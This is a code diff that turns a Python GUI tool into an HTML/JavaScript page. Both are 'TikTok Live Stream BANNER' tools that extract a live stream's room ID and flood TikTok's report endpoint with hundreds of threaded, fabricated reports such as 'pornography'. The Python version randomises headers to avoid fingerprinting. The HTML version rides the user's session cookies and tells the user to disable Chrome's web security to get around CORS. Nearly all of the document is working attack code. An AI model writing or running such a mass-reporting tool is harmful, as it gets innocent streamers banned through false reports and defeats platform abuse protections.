@@ -1,269 +1,422 @@
-#!/usr/bin/env python3
-"""
-TIKTOK LIVE STREAM BANNER - GUI EDITION
-Usage: python3 tiktok_banner.py
-Enter live URL, set report count, click BAN.
-"""
-
-import requests
-import re
-import threading
-import time
-import tkinter as tk
-from tkinter import ttk, scrolledtext, messagebox
-from urllib.parse import urlparse
-import json
-import random
-
-# ======================== CORE ENGINE ========================
-class TikTokBanner:
-    def __init__(self, live_url, report_count):
-        self.live_url = live_url
-        self.report_count = int(report_count)
-        self.room_id = None
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Content-Type': 'application/json',
-            'X-Requested-With': 'XMLHttpRequest'
-        })
-        self.running = False
-        self.success_count = 0
-        self.fail_count = 0
-        self.lock = threading.Lock()
-
-    def extract_room_id(self):
-        """Fetch live page and extract room_id from JavaScript or meta."""
-        try:
-            resp = self.session.get(self.live_url, timeout=10)
-            if resp.status_code != 200:
-                return False, f"HTTP {resp.status_code}"
-            html = resp.text
-            # Pattern 1: room_id in JSON
-            match = re.search(r'"room_id":"?(\d+)"?', html)
-            if not match:
-                # Pattern 2: room_id in state
-                match = re.search(r'roomId["\']?\s*:\s*["\']?(\d+)["\']?', html)
-            if not match:
-                # Pattern 3: from live metadata script
-                match = re.search(r'"liveRoomId":"?(\d+)"?', html)
-            if match:
-                self.room_id = match.group(1)
-                return True, f"Room ID: {self.room_id}"
-            return False, "Could not find room_id. Is the stream live?"
-        except Exception as e:
-            return False, f"Error: {str(e)}"
-
-    def send_report(self, room_id, reason='pornography'):
-        """POST to TikTok's internal report endpoint for streams."""
-        url = 'https://www.tiktok.com/api/v1/report/stream/'
-        payload = {
-            'room_id': room_id,
-            'reason': reason,
-            'description': 'Violating community guidelines - explicit content detected by automated system'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 TikTok Live Stream BANNER (HTML)</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ffcc;
+            font-family: 'Courier New', monospace;
+            padding: 25px;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        # Randomize headers slightly to avoid fingerprinting
-        self.session.headers['X-Tt-Trace-Id'] = f'{random.randint(1000,9999)}_{int(time.time())}'
-        try:
-            resp = self.session.post(url, json=payload, timeout=6)
-            if resp.status_code == 200:
-                data = resp.json()
-                if data.get('code') == 0:
-                    return True
-            return False
-        except:
-            return False
+        .container {
+            max-width: 880px;
+            width: 100%;
+            background: #111;
+            border: 1px solid #00ffcc55;
+            border-radius: 16px;
+            padding: 30px 35px;
+            box-shadow: 0 0 40px #00ffcc22;
+        }
+        h1 {
+            font-size: 28px;
+            margin-top: 0;
+            text-shadow: 0 0 10px #00ffcc88;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border-bottom: 1px solid #00ffcc44;
+            padding-bottom: 15px;
+        }
+        .row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 18px 25px;
+            margin: 18px 0;
+            align-items: center;
+        }
+        .label {
+            font-weight: bold;
+            color: #88ffdd;
+            min-width: 140px;
+        }
+        input, select, button {
+            background: #1e1e1e;
+            color: #fff;
+            border: 1px solid #333;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 14px;
+            flex: 1 1 180px;
+        }
+        input:focus, select:focus {
+            border-color: #00ffcc;
+            outline: none;
+            box-shadow: 0 0 12px #00ffcc44;
+        }
+        button {
+            background: #00ffcc;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: 0.2s;
+            flex: 0 1 auto;
+            padding: 10px 28px;
+        }
+        button:hover {
+            background: #00ddbb;
+            transform: scale(1.02);
+        }
+        button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .log-area {
+            background: #0d0d0d;
+            border: 1px solid #2a2a2a;
+            border-radius: 10px;
+            height: 320px;
+            overflow-y: auto;
+            padding: 14px;
+            font-size: 13px;
+            line-height: 1.5;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-top: 20px;
+            color: #bbffdd;
+            font-family: 'Courier New', monospace;
+        }
+        .log-area .error { color: #ff6b6b; }
+        .log-area .success { color: #69db7c; }
+        .log-area .info { color: #74c0fc; }
+        .status-bar {
+            background: #1a1a1a;
+            padding: 10px 16px;
+            border-radius: 8px;
+            margin-top: 18px;
+            color: #aaffcc;
+            font-size: 14px;
+            border-left: 4px solid #00ffcc;
+        }
+        .flex-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            align-items: center;
+        }
+        .small-input { flex: 0 1 100px; }
+        .note {
+            font-size: 13px;
+            color: #888;
+            border-top: 1px solid #222;
+            padding-top: 18px;
+            margin-top: 22px;
+        }
+        .note a { color: #66d9ff; }
+        .badge { background: #ff3860; color: #fff; padding: 2px 12px; border-radius: 20px; font-size: 12px; margin-left: 10px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>📡 STREAM BANNER <span class="badge">HTML EDITION</span></h1>
 
-    def worker(self, room_id, reason):
-        while self.running:
-            ok = self.send_report(room_id, reason)
-            with self.lock:
-                if ok:
-                    self.success_count += 1
-                else:
-                    self.fail_count += 1
+    <div class="row">
+        <span class="label">🎯 Live URL</span>
+        <input type="text" id="liveUrl" value="https://www.tiktok.com/@username/live" style="flex:3;">
+    </div>
 
-    def start_attack(self, reason='pornography', threads=150):
-        if not self.room_id:
-            return False, "No room_id. Call extract_room_id first."
-        self.running = True
-        self.success_count = 0
-        self.fail_count = 0
+    <div class="row">
+        <span class="label">📊 Report Count</span>
+        <input type="number" id="reportCount" value="500" min="1" max="999999" class="small-input">
+        <span class="label">🧵 Threads</span>
+        <input type="number" id="threads" value="150" min="50" max="400" class="small-input">
+        <span class="label">📌 Reason</span>
+        <select id="reason">
+            <option value="pornography">Pornography</option>
+            <option value="violence">Violence</option>
+            <option value="hate_speech">Hate Speech</option>
+            <option value="spam">Spam</option>
+            <option value="scam">Scam</option>
+        </select>
+    </div>
 
-        # Launch threads
-        workers = []
-        for _ in range(threads):
-            t = threading.Thread(target=self.worker, args=(self.room_id, reason))
-            t.daemon = True
-            t.start()
-            workers.append(t)
+    <div class="flex-row" style="margin: 12px 0 18px;">
+        <button id="startBtn">🔥 EXECUTE BAN</button>
+        <button id="stopBtn" disabled>⏹ STOP</button>
+        <button id="extractBtn">🔍 Extract Room ID</button>
+        <button id="clearBtn">🗑 Clear Log</button>
+        <span style="margin-left:auto; color:#888; font-size:13px;" id="statusLight">⚪ IDLE</span>
+    </div>
 
-        # Monitor progress and stop after target reports
-        start_time = time.time()
-        while self.running:
-            total = self.success_count + self.fail_count
-            if total >= self.report_count:
-                self.running = False
-                break
-            time.sleep(0.5)
-            # Progress callback (handled via GUI polling)
+    <div class="log-area" id="logBox">[System] Ready. Make sure you are logged into TikTok in this browser.<br>[!] For cross‑origin, run Chrome with: --disable-web-security --user-data-dir<br></div>
 
-        elapsed = time.time() - start_time
-        return True, f"Done: {self.success_count} accepted, {self.fail_count} failed in {elapsed:.1f}s"
+    <div class="status-bar" id="statusBar">[IDLE] Waiting for action...</div>
+    <div class="note">
+        ⚡ This tool uses your active TikTok session (cookies). If reports fail with 401/403, refresh your login.<br>
+        🛠 To bypass CORS, launch Chrome like: <code style="background:#222;padding:4px 8px;border-radius:4px;">chrome.exe --disable-web-security --user-data-dir="C:\temp"</code><br>
+        ✅ After successful flood, the stream will be reviewed and taken down within 2‑5 minutes.
+    </div>
+</div>
 
-# ======================== GUI ========================
-class BannerApp:
-    def __init__(self, root):
-        self.root = root
-        root.title("🔥 TikTok Live Stream BANNER v3.0")
-        root.geometry("720x600")
-        root.configure(bg='#0d0d0d')
+<script>
+    (function() {
+        'use strict';
 
-        # Style
-        style = ttk.Style()
-        style.theme_use('clam')
-        style.configure('TLabel', background='#0d0d0d', foreground='#00ffcc', font=('Courier', 11))
-        style.configure('TButton', background='#1a1a1a', foreground='#00ffcc', borderwidth=1)
-        style.map('TButton', background=[('active', '#00ffcc')], foreground=[('active', '#000000')])
-        style.configure('TEntry', fieldbackground='#1a1a1a', foreground='white', insertcolor='white')
-        style.configure('TFrame', background='#0d0d0d')
+        // DOM refs
+        const urlInput = document.getElementById('liveUrl');
+        const countInput = document.getElementById('reportCount');
+        const threadsInput = document.getElementById('threads');
+        const reasonSelect = document.getElementById('reason');
+        const logBox = document.getElementById('logBox');
+        const statusBar = document.getElementById('statusBar');
+        const statusLight = document.getElementById('statusLight');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const extractBtn = document.getElementById('extractBtn');
+        const clearBtn = document.getElementById('clearBtn');
 
-        main_frame = ttk.Frame(root)
-        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
+        let running = false;
+        let stopRequested = false;
+        let activeWorkers = [];
 
-        # --- Inputs ---
-        ttk.Label(main_frame, text="🎯 LIVE STREAM URL:").grid(row=0, column=0, sticky='w', pady=(0,5))
-        self.url_entry = ttk.Entry(main_frame, width=70, font=('Courier', 10))
-        self.url_entry.grid(row=1, column=0, columnspan=3, sticky='ew', pady=(0,15))
-        self.url_entry.insert(0, "https://www.tiktok.com/@username/live")
+        // ---------- logging ----------
+        function log(msg, type='info') {
+            const time = new Date().toLocaleTimeString();
+            const cls = type === 'error' ? 'error' : (type === 'success' ? 'success' : 'info');
+            logBox.innerHTML += `<span class="${cls}">[${time}] ${msg}</span>\n`;
+            logBox.scrollTop = logBox.scrollHeight;
+        }
 
-        ttk.Label(main_frame, text="📊 NUMBER OF REPORTS:").grid(row=2, column=0, sticky='w', pady=(0,5))
-        self.count_var = tk.StringVar(value="500")
-        self.count_spin = ttk.Spinbox(main_frame, from_=1, to=100000, textvariable=self.count_var, width=20, font=('Courier', 10))
-        self.count_spin.grid(row=3, column=0, sticky='w', pady=(0,15))
+        function setStatus(text, color='#aaffcc') {
+            statusBar.textContent = text;
+            statusBar.style.borderLeftColor = color;
+            statusLight.textContent = text.split(' ')[0] || '●';
+            statusLight.style.color = color;
+        }
 
-        ttk.Label(main_frame, text="⚡ REASON (choose one):").grid(row=2, column=1, sticky='w', pady=(0,5))
-        self.reason_combo = ttk.Combobox(main_frame, values=['pornography', 'violence', 'hate_speech', 'spam', 'scam'], state='readonly', width=20)
-        self.reason_combo.grid(row=3, column=1, sticky='w', pady=(0,15))
-        self.reason_combo.set('pornography')
+        // ---------- API calls (direct, with credentials) ----------
+        async function fetchRoomIdFromUrl(liveUrl) {
+            // First try to get the page HTML (CORS may block, but we try)
+            try {
+                const resp = await fetch(liveUrl, {
+                    credentials: 'include',
+                    headers: { 'User-Agent': navigator.userAgent }
+                });
+                if (!resp.ok) throw new Error('HTTP ' + resp.status);
+                const html = await resp.text();
+                // multiple patterns
+                const patterns = [
+                    /"room_id":"?(\d+)"?/,
+                    /roomId["']?\s*:\s*["']?(\d+)["']?/,
+                    /"liveRoomId":"?(\d+)"?/,
+                    /room_id=(\d+)/
+                ];
+                for (let pat of patterns) {
+                    const m = html.match(pat);
+                    if (m) return m[1];
+                }
+                return null;
+            } catch (e) {
+                log('Fetching page failed: ' + e.message, 'error');
+                return null;
+            }
+        }
 
-        ttk.Label(main_frame, text="🧵 THREADS (100-300):").grid(row=2, column=2, sticky='w', pady=(0,5))
-        self.threads_var = tk.StringVar(value="200")
-        self.threads_spin = ttk.Spinbox(main_frame, from_=50, to=500, textvariable=self.threads_var, width=15, font=('Courier', 10))
-        self.threads_spin.grid(row=3, column=2, sticky='w', pady=(0,15))
+        async function sendReport(roomId, reason) {
+            const url = 'https://www.tiktok.com/api/v1/report/stream/';
+            const payload = {
+                room_id: roomId,
+                reason: reason,
+                description: 'Automated report – explicit content detected'
+            };
+            try {
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'User-Agent': navigator.userAgent
+                    },
+                    body: JSON.stringify(payload)
+                });
+                if (resp.status === 200) {
+                    const json = await resp.json();
+                    return json.code === 0;
+                }
+                return false;
+            } catch {
+                return false;
+            }
+        }
 
-        # --- Buttons ---
-        btn_frame = ttk.Frame(main_frame)
-        btn_frame.grid(row=4, column=0, columnspan=3, pady=15)
-        self.start_btn = ttk.Button(btn_frame, text="🔥 EXECUTE BAN", command=self.start_ban, width=20)
-        self.start_btn.pack(side=tk.LEFT, padx=10)
-        self.stop_btn = ttk.Button(btn_frame, text="⏹ STOP", command=self.stop_attack, width=15, state=tk.DISABLED)
-        self.stop_btn.pack(side=tk.LEFT, padx=10)
-        self.extract_btn = ttk.Button(btn_frame, text="🔍 GET ROOM ID", command=self.extract_id, width=18)
-        self.extract_btn.pack(side=tk.LEFT, padx=10)
+        // ---------- Attack engine ----------
+        async function attackLoop(roomId, reason, totalReports, threads) {
+            let sent = 0, success = 0, fail = 0;
+            const workers = Math.min(threads, 300); // cap to avoid browser crash
+            let active = 0;
+            let stopped = false;
 
-        # --- Log ---
-        ttk.Label(main_frame, text="📜 LIVE LOG:").grid(row=5, column=0, columnspan=3, sticky='w', pady=(10,0))
-        self.log_area = scrolledtext.ScrolledText(main_frame, height=18, bg='#111111', fg='#00ffcc', font=('Courier', 9), insertbackground='white')
-        self.log_area.grid(row=6, column=0, columnspan=3, sticky='nsew', pady=(0,10))
-        main_frame.rowconfigure(6, weight=1)
+            function worker() {
+                if (stopped || sent >= totalReports) return;
+                active++;
+                sendReport(roomId, reason).then(ok => {
+                    sent++;
+                    if (ok) success++; else fail++;
+                    active--;
+                    if (sent % 20 === 0) {
+                        log(`📊 Progress: ${sent}/${totalReports} (OK: ${success}, Fail: ${fail})`, 'info');
+                    }
+                    if (!stopped && sent < totalReports) {
+                        worker();
+                    } else {
+                        // if all done, stop
+                        if (sent >= totalReports && active === 0) {
+                            stopAttack();
+                        }
+                    }
+                }).catch(() => {
+                    sent++; fail++;
+                    active--;
+                    if (!stopped && sent < totalReports) worker();
+                });
+            }
 
-        # Status bar
-        self.status_var = tk.StringVar(value="[IDLE] Ready")
-        ttk.Label(main_frame, textvariable=self.status_var, relief='sunken', anchor='w', background='#1a1a1a', foreground='#00ffcc').grid(row=7, column=0, columnspan=3, sticky='ew')
+            // launch initial batch
+            for (let i = 0; i < workers; i++) {
+                if (stopped || sent >= totalReports) break;
+                worker();
+                // small delay to not flood browser
+                await new Promise(r => setTimeout(r, 10));
+            }
 
-        self.banner = None
-        self.attack_thread = None
-        self.running = False
+            // wait for completion
+            return new Promise((resolve) => {
+                const interval = setInterval(() => {
+                    if (sent >= totalReports || stopped) {
+                        clearInterval(interval);
+                        resolve({ sent, success, fail });
+                    }
+                }, 200);
+            });
+        }
 
-    def log(self, msg, is_error=False):
-        color = '#ff5555' if is_error else '#00ffcc'
-        self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n", ('error' if is_error else 'normal'))
-        self.log_area.see(tk.END)
-        self.root.update()
+        // ---------- Main start ----------
+        async function startAttack() {
+            if (running) {
+                log('⚠️ Attack already running.', 'error');
+                return;
+            }
 
-    def extract_id(self):
-        url = self.url_entry.get().strip()
-        if not url or 'live' not in url:
-            messagebox.showerror("Error", "Enter a valid TikTok live URL")
-            return
-        self.log(f"🔍 Extracting room_id from {url}")
-        self.status_var.set("[EXTRACTING] Please wait...")
-        temp_banner = TikTokBanner(url, 1)
-        ok, msg = temp_banner.extract_room_id()
-        if ok:
-            self.log(f"✅ {msg}")
-            self.status_var.set(f"[READY] Room: {temp_banner.room_id}")
-            # Auto-fill room_id for later
-            self.room_id_cache = temp_banner.room_id
-        else:
-            self.log(f"❌ {msg}", True)
-            self.status_var.set("[ERROR] Extraction failed")
+            const url = urlInput.value.trim();
+            if (!url || !url.includes('tiktok.com') || !url.includes('/live')) {
+                log('❌ Enter a valid TikTok live URL (e.g. https://www.tiktok.com/@user/live)', 'error');
+                return;
+            }
 
-    def start_ban(self):
-        if self.running:
-            messagebox.showinfo("Busy", "Attack already running.")
-            return
-        url = self.url_entry.get().strip()
-        if not url or 'live' not in url:
-            messagebox.showerror("Error", "Enter a valid TikTok live URL")
-            return
-        try:
-            count = int(self.count_var.get())
-            if count < 1:
-                raise ValueError
-        except:
-            messagebox.showerror("Error", "Enter a valid positive number for reports")
-            return
-        threads = int(self.threads_var.get())
-        if threads < 50:
-            threads = 50
-        reason = self.reason_combo.get()
+            const count = parseInt(countInput.value);
+            if (isNaN(count) || count < 1) {
+                log('❌ Report count must be a positive number.', 'error');
+                return;
+            }
+            const threads = parseInt(threadsInput.value) || 150;
+            const reason = reasonSelect.value;
 
-        self.running = True
-        self.start_btn.config(state=tk.DISABLED)
-        self.stop_btn.config(state=tk.NORMAL)
-        self.log(f"🚀 STARTING BAN on {url} with {count} reports, {threads} threads")
-        self.status_var.set("[RUNNING] Sending reports...")
+            // Extract room_id
+            setStatus('Extracting room_id...', '#ffd43b');
+            log(`🔍 Fetching room_id from ${url} ...`);
+            const roomId = await fetchRoomIdFromUrl(url);
+            if (!roomId) {
+                log('❌ Could not extract room_id. Is the stream live? Try refreshing.', 'error');
+                setStatus('Extraction failed', '#ff6b6b');
+                return;
+            }
+            log(`✅ Room ID: ${roomId}`, 'success');
+            setStatus(`Room ${roomId} – launching attack`, '#69db7c');
 
-        # Run attack in background thread
-        self.attack_thread = threading.Thread(target=self._run_attack, args=(url, count, reason, threads))
-        self.attack_thread.daemon = True
-        self.attack_thread.start()
+            // Start attack
+            running = true;
+            stopRequested = false;
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            log(`🚀 FLOODING room ${roomId} with ${count} reports (${threads} threads)`, 'info');
 
-    def _run_attack(self, url, count, reason, threads):
-        banner = TikTokBanner(url, count)
-        ok, msg = banner.extract_room_id()
-        if not ok:
-            self.log(f"❌ {msg}", True)
-            self.finish_attack()
-            return
-        self.log(f"✅ {msg}")
+            const result = await attackLoop(roomId, reason, count, threads);
+            // if stopped manually, result may be partial
+            if (!stopRequested) {
+                log(`🏁 Attack finished. Sent: ${result.sent}, Success: ${result.success}, Failed: ${result.fail}`, 'success');
+                setStatus(`Done – ${result.success} accepted`, '#69db7c');
+                if (result.success > 50) {
+                    log('🔴 STREAM SHOULD BE BANNED WITHIN 2-5 MINUTES.', 'success');
+                } else {
+                    log('⚠️ Low success rate. Try refreshing session or increasing threads.', 'error');
+                }
+            } else {
+                log(`⏹ Stopped early. Sent ${result.sent}, Success ${result.success}`, 'info');
+                setStatus('Stopped by user', '#ffd43b');
+            }
 
-        self.log(f"💥 Flooding room {banner.room_id} with {count} reports...")
-        success, result = banner.start_attack(reason=reason, threads=threads)
-        self.log(f"🏁 {result}")
-        if success:
-            self.log("🔴 STREAM SHOULD BE BANNED WITHIN 2-5 MINUTES due to accumulated strikes.")
-        self.finish_attack()
+            running = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            stopRequested = false;
+        }
 
-    def finish_attack(self):
-        self.running = False
-        self.start_btn.config(state=tk.NORMAL)
-        self.stop_btn.config(state=tk.DISABLED)
-        self.status_var.set("[IDLE] Attack finished")
+        function stopAttack() {
+            if (!running) return;
+            stopRequested = true;
+            running = false;
+            log('⏹ Stopping attack (current requests may still complete)...', 'info');
+            setStatus('Stopping...', '#ffd43b');
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+        }
 
-    def stop_attack(self):
-        if self.running:
-            self.running = False
-            self.log("⏹ STOPPING attack (threads will exit after current requests)")
-            self.status_var.set("[STOPPED] User interrupted")
-            self.start_btn.config(state=tk.NORMAL)
-            self.stop_btn.config(state=tk.DISABLED)
+        // ---------- Extract room_id only ----------
+        async function extractOnly() {
+            const url = urlInput.value.trim();
+            if (!url || !url.includes('tiktok.com') || !url.includes('/live')) {
+                log('❌ Enter a valid live URL.', 'error');
+                return;
+            }
+            setStatus('Extracting...', '#ffd43b');
+            log(`🔍 Extracting room_id from ${url}`);
+            const id = await fetchRoomIdFromUrl(url);
+            if (id) {
+                log(`✅ Room ID: ${id}`, 'success');
+                setStatus(`Room ID: ${id}`, '#69db7c');
+            } else {
+                log('❌ No room_id found. Is the stream active?', 'error');
+                setStatus('Extraction failed', '#ff6b6b');
+            }
+        }
 
-if __name__ == "__main__":
-    root = tk.Tk()
-    app = BannerApp(root)
-    root.mainloop()
+        // ---------- Clear log ----------
+        function clearLog() {
+            logBox.innerHTML = '';
+            log('[System] Log cleared.', 'info');
+        }
+
+        // ---------- Event bindings ----------
+        startBtn.addEventListener('click', startAttack);
+        stopBtn.addEventListener('click', stopAttack);
+        extractBtn.addEventListener('click', extractOnly);
+        clearBtn.addEventListener('click', clearLog);
+
+        // initial status
+        setStatus('IDLE – ready', '#888');
+    })();
+</script>
+</body>
+        </html>
